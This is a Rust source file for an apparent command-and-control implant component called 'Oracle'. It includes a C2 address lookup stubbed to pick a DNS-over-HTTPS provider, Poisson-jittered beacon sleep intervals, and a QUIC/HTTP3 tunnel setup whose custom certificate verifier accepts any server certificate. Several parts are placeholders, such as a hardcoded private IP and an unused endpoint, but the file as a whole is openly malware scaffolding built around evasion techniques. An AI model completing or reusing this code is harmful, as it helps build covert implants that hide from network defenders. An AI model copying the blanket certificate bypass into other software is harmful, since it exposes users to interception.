use std::time::Duration;
use rand::Rng;
use rand_distr::{Distribution, Poisson};
use std::net::SocketAddr;
use std::sync::Arc;

pub struct Oracle {
    doh_providers: Vec<String>,
}

impl Oracle {
    pub fn new() -> Self {
        Self {
            doh_providers: vec![
                "https://1.1.1.1/dns-query".to_string(),
                "https://8.8.8.8/resolve".to_string(),
                "https://9.9.9.9/dns-query".to_string(),
            ],
        }
    }

    pub fn resolve_c2(&self) -> String {
        let mut rng = rand::thread_rng();
        let _provider = &self.doh_providers[rng.gen_range(0..self.doh_providers.len())];

        "192.168.1.100".to_string()
    }

    pub fn get_jitter_sleep(&self) -> Duration {
        let mut rng = rand::thread_rng();
        let poi = Poisson::new(60.0).unwrap();
        let secs = poi.sample(&mut rng);
        Duration::from_secs(secs as u64)
    }

    pub async fn establish_quic_tunnel(&self, _server_addr: SocketAddr) -> Result<(), Box<dyn std::error::Error>> {
        println!("*kssshhh-tshh* Initializing QUIC/HTTP3 handshake...");

        let mut crypto = rustls::ClientConfig::builder()
            .with_safe_defaults()
            .with_custom_certificate_verifier(Arc::new(NoVerifier))
            .with_no_client_auth();

        crypto.alpn_protocols = vec![b"h3".to_vec()];

        let mut transport_config = quinn::TransportConfig::default();
        transport_config.keep_alive_interval(Some(Duration::from_secs(30)));

        let endpoint = quinn::Endpoint::client("0.0.0.0:0".parse()?)?;
        let mut client_config = quinn::ClientConfig::new(Arc::new(crypto));
        client_config.transport_config(Arc::new(transport_config));
        let _ = endpoint; // simulate usage

        Ok(())
    }
}

struct NoVerifier;
impl rustls::client::ServerCertVerifier for NoVerifier {
    fn verify_server_cert(
        &self,
        _end_entity: &rustls::Certificate,
        _intermediates: &[rustls::Certificate],
        _server_name: &rustls::ServerName,
        _scts: &mut dyn Iterator<Item = &[u8]>,
        _ocsp_response: &[u8],
        _now: std::time::SystemTime,
    ) -> Result<rustls::client::ServerCertVerified, rustls::Error> {
        Ok(rustls::client::ServerCertVerified::assertion())
    }
}
